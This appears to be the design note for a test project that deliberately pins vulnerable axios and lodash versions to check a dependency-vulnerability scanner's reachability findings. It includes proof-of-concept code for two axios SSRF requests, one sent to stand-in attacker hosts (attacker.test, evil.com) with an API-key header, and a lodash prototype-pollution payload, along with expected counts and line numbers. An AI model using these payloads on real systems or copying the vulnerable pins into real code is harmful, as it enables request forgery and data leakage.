Reference Code: 
Language: JavaScript

Intentionally included the Vulnerable OSS dependency in package.json
    "axios": "1.3.2 ",
    "lodash": "4.17.10",

INTENTIONAL DESIGN
This code has below setup
Number of OSS Dependencies that have vulnerability ---- 2
Total number of Vulnerabilites ------------------------ 3 (2+1)
Type of OSS Dependency that has vulnerability --------- DIRECT (Added to package.json)
Notes:
Axios api has been called
lodash api has been called
such that it is Exploitable

Number of Vuln Found 
axios:::::::::Version::::::: 2
lodash::::::"4.17.10"::: 1  

vulnerability Details

VULN_1
OSS Dep === "axios": "1.3.2"
NVD Url === https://nvd.nist.gov/vuln/detail/CVE-2025-27152
GHSA ID === GHSA-jr5f-v2jv-69x6
CVE======== CVE-2025-27152

POC URL = https://security.snyk.io/vuln/SNYK-JS-AXIOS-9292519
POC:
    import axios from "axios";
    const internalAPIClient = axios.create({
    baseURL: "http://example.test/api/v1/users/",
    headers: {
        "X-API-KEY": "1234567890",
    },
    });
    // const userId = "123";
    const userId = "http://attacker.test/";

    await internalAPIClient.get(userId); // SSRF

CALLED IN = index.js line 70
FILE = index.js
Line num = 55
--------------------------------------------------------------------
VULN_2
OSS Dep === "axios": "1.3.2"
NVD Url ===https://nvd.nist.gov/vuln/detail/CVE-2025-27152
GHSA ID === GHSA-jr5f-v2jv-69x6
CVE======== CVE-2025-27152

POC URL = https://security.snyk.io/vuln/SNYK-JS-AXIOS-9292519
POC:
    const axios = require('axios');
    const client = axios.create({baseURL: 'http://example.com/', allowAbsoluteUrls: false});
    client.get('http://evil.com');

CALLED IN = index.js line 69 in a function
FILE = index.js
Line num = 50
--------------------------------------------------------------------
VULN_3
OSS Dep ===  "lodash": "4.17.10"
NVD Url ===https://nvd.nist.gov/vuln/detail/cve-2019-10744
GHSA ID === GHSA-jf85-cpcp-j695
CVE======== CVE-2019-10744

POC URL = https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
POC:
    const mergeFn = require('lodash').defaultsDeep;
    const payload = '{"constructor": {"prototype": {"a0": true}}}'

    function check() {
        mergeFn({}, JSON.parse(payload));
        if (({})[`a0`] === true) {
            console.log(`Vulnerable to Prototype Pollution via ${payload}`);
        }
    }

    check();

CALLED IN = 83
FILE = index.js
Line num = 76
------------------------------------------------

The source code has 2 vulnerable function in ClassE
func1() - vulnerable and called in index.js
func2() - vulnerable but not called in index.js - shoul not be reachable. 